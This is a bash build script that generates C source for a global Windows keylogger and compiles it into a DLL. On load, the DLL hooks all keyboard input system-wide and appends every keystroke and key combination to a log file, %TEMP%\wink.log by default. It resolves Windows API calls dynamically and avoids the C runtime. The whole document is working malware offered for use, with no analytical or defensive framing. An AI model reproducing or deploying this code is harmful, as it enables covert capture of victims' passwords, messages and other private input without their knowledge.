#!/bin/bash

# === DEFAULT CONFIGURATION ===
DEFAULT_LOG_PATH="%TEMP%\\wink.log"

# Variables that can be overridden by arguments
LOG_PATH="$DEFAULT_LOG_PATH"

# === USAGE ===
usage() {
    echo "Usage: $0 [--log <log_path>]"
    echo "Example:"
    echo "  $0                                # Use default path: %TEMP%\\wink.log"
    echo "  $0 --log C:\\\\temp\\\\keys.log     # Save to custom path"
    exit 1
}

# === ARGUMENT PARSING ===
while [[ $# -gt 0 ]]; do
    case "$1" in
        --log)
            if [[ -z "$2" || "$2" =~ ^-- ]]; then
                echo "[-] Error: --log requires a value."
                usage
            fi
            LOG_PATH="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
done

# Minimal validation
if [[ -z "$LOG_PATH" ]]; then
    echo "[-] Log path cannot be empty."
    exit 1
fi

# Escape backslashes for C
LOG_PATH_ESCAPED="${LOG_PATH//\\/\\\\}"

# === GENERATE module.c ===
cat > module.c << EOF
// module.c - Global Keylogger 100% Windows API (no CRT)
#include <windows.h>

// Manual definitions to avoid dependency on full headers
#ifndef LRESULT
typedef LONG_PTR LRESULT;
#endif

#ifndef HOOKPROC
typedef LRESULT (CALLBACK* HOOKPROC)(int, WPARAM, LPARAM);
#endif

// Global variables for the hook and file
HHOOK g_hHook = NULL;
HANDLE g_hLogFile = INVALID_HANDLE_VALUE;
HMODULE g_hModule = NULL;

// Forward declaration with explicit type
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// Function to expand %TEMP% or environment variables if needed
void ExpandLogPath(char* dest, const char* src, DWORD destSize) {
    // Try to expand environment variables
    DWORD (WINAPI * pExpandEnvironmentStringsA)(LPCSTR, LPSTR, DWORD) = 
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExpandEnvironmentStringsA");
    
    if (pExpandEnvironmentStringsA) {
        pExpandEnvironmentStringsA(src, dest, destSize);
    } else {
        // Fallback: copy directly if expansion is not possible
        for (DWORD i = 0; i < destSize - 1 && src[i]; i++) {
            dest[i] = src[i];
        }
        dest[destSize - 1] = 0;
    }
}

// Function to open the log file
BOOL OpenLogFile() {
    char expandedPath[MAX_PATH];
    ExpandLogPath(expandedPath, "$LOG_PATH_ESCAPED", MAX_PATH);

    HANDLE (WINAPI * pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) =
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateFileA");

    if (!pCreateFileA) return FALSE;

    g_hLogFile = pCreateFileA(
        expandedPath,
        0x40000000 | 0x80000000, // GENERIC_WRITE | GENERIC_READ
        1,                        // FILE_SHARE_READ
        NULL,
        4,                        // OPEN_ALWAYS
        0,
        NULL
    );

    if (g_hLogFile == (HANDLE)-1) {
        g_hLogFile = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    // Move cursor to the end of the file
    BOOL (WINAPI * pSetFilePointerEx)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD) =
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetFilePointerEx");
    if (pSetFilePointerEx) {
        LARGE_INTEGER distance, newpos;
        distance.QuadPart = 0;
        pSetFilePointerEx(g_hLogFile, distance, &newpos, 2); // FILE_END = 2
    }

    return TRUE;
}

// Function to write to the log
void WriteLog(const char* text) {
    if (g_hLogFile == INVALID_HANDLE_VALUE) return;

    DWORD written;
    BOOL (WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) =
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile");

    if (!pWriteFile) return;

    size_t len = strlen(text);
    if (len > 0) {
        pWriteFile(g_hLogFile, text, (DWORD)len, &written, NULL);
    }
}

// Function to get modifier key state
BOOL IsKeyDown(int vk) {
    SHORT (WINAPI * pGetAsyncKeyState)(int) = 
        (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "GetAsyncKeyState");
    if (!pGetAsyncKeyState) return FALSE;
    return (pGetAsyncKeyState(vk) & 0x8000) != 0;
}

// Keyboard hook callback
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char buffer[32] = {0};
            BOOL shift = IsKeyDown(VK_SHIFT);
            BOOL caps = IsKeyDown(VK_CAPITAL);
            BOOL ctrl = IsKeyDown(VK_CONTROL);
            BOOL alt = IsKeyDown(VK_MENU);

            switch (pKey->vkCode) {
                case VK_RETURN: strcpy(buffer, "[ENTER]\r\n"); break;
                case VK_BACK:   strcpy(buffer, "[BACKSPACE]"); break;
                case VK_TAB:    strcpy(buffer, "[TAB]"); break;
                case VK_ESCAPE: strcpy(buffer, "[ESC]"); break;
                case VK_SPACE:  strcpy(buffer, " "); break;
                case VK_LWIN:
                case VK_RWIN:   strcpy(buffer, "[WIN]"); break;
                case VK_CAPITAL:strcpy(buffer, "[CAPSLOCK]"); break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT: strcpy(buffer, "[SHIFT]"); break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL: strcpy(buffer, "[CTRL]"); break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU: strcpy(buffer, "[ALT]"); break;
                default:
                    if (pKey->vkCode >= 0x30 && pKey->vkCode <= 0x5A) {
                        char c = (char)pKey->vkCode;
                        if (pKey->vkCode >= 0x41 && pKey->vkCode <= 0x5A) {
                            if ((caps && !shift) || (!caps && shift)) {
                                c = c; // uppercase
                            } else {
                                c = c + 32; // lowercase
                            }
                        }
                        buffer[0] = c;
                        buffer[1] = 0;
                    } else if (pKey->vkCode >= 0x60 && pKey->vkCode <= 0x69) {
                        buffer[0] = (char)(pKey->vkCode - 0x30);
                        buffer[1] = 0;
                    } else {
                        buffer[0] = '?';
                        buffer[1] = 0;
                    }
                    break;
            }

            if (ctrl) {
                if (pKey->vkCode == 'C') { strcpy(buffer, "[CTRL+C]"); }
                else if (pKey->vkCode == 'V') { strcpy(buffer, "[CTRL+V]"); }
                else if (pKey->vkCode == 'X') { strcpy(buffer, "[CTRL+X]"); }
                else if (pKey->vkCode == 'A') { strcpy(buffer, "[CTRL+A]"); }
                else if (pKey->vkCode == 'Z') { strcpy(buffer, "[CTRL+Z]"); }
            }

            if (alt && pKey->vkCode == VK_TAB) {
                strcpy(buffer, "[ALT+TAB]");
            }

            WriteLog(buffer);
        }
    }

    // Call the next hook
    LRESULT (WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM) =
        (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "CallNextHookEx");
    if (pCallNextHookEx) {
        return pCallNextHookEx(g_hHook, nCode, wParam, lParam);
    }
    return 0;
}

// Install the hook
BOOL InstallHook(HMODULE hModule) {
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) return FALSE;

    HHOOK (WINAPI * pSetWindowsHookExA)(int, HOOKPROC, HMODULE, DWORD) =
        (void*)GetProcAddress(hUser32, "SetWindowsHookExA");

    if (!pSetWindowsHookExA) return FALSE;

    // Explicit cast to avoid warning
    g_hHook = pSetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hModule, 0);
    return (g_hHook != NULL);
}

// Release the hook
void UninstallHook() {
    if (g_hHook) {
        BOOL (WINAPI * pUnhookWindowsHookEx)(HHOOK) =
            (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "UnhookWindowsHookEx");
        if (pUnhookWindowsHookEx) {
            pUnhookWindowsHookEx(g_hHook);
        }
        g_hHook = NULL;
    }
}

// Close log file
void CloseLogFile() {
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        BOOL (WINAPI * pCloseHandle)(HANDLE) =
            (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
        if (pCloseHandle) {
            pCloseHandle(g_hLogFile);
        }
        g_hLogFile = INVALID_HANDLE_VALUE;
    }
}

// DLL entry point
__declspec(dllexport) BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            g_hModule = hModule;
            DisableThreadLibraryCalls(hModule);

            if (!OpenLogFile()) {
                return FALSE;
            }

            if (!InstallHook(hModule)) {
                CloseLogFile();
                return FALSE;
            }
            break;

        case DLL_PROCESS_DETACH:
            UninstallHook();
            CloseLogFile();
            break;
    }
    return TRUE;
}

// strlen helper (no CRT)
size_t strlen(const char* str) {
    size_t len = 0;
    while (str[len]) len++;
    return len;
}

// strcpy helper (no CRT)
char* strcpy(char* dest, const char* src) {
    char* tmp = dest;
    while ((*dest++ = *src++) != '\0');
    return tmp;
}

EOF

echo "[+] C file generated: module.c"

# === COMPILE AS DLL ===
echo "[*] Compiling keylogger.dll..."

x86_64-w64-mingw32-gcc module.c -o keylogger.dll -shared -s \
  -nostdlib -nodefaultlibs -lkernel32 -luser32 \
  -e DllMain 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[-] Error compiling C code."
    exit 1
fi

echo "[+] Compilation successful: keylogger.dll"
echo "[*] Keystrokes logged to: $LOG_PATH"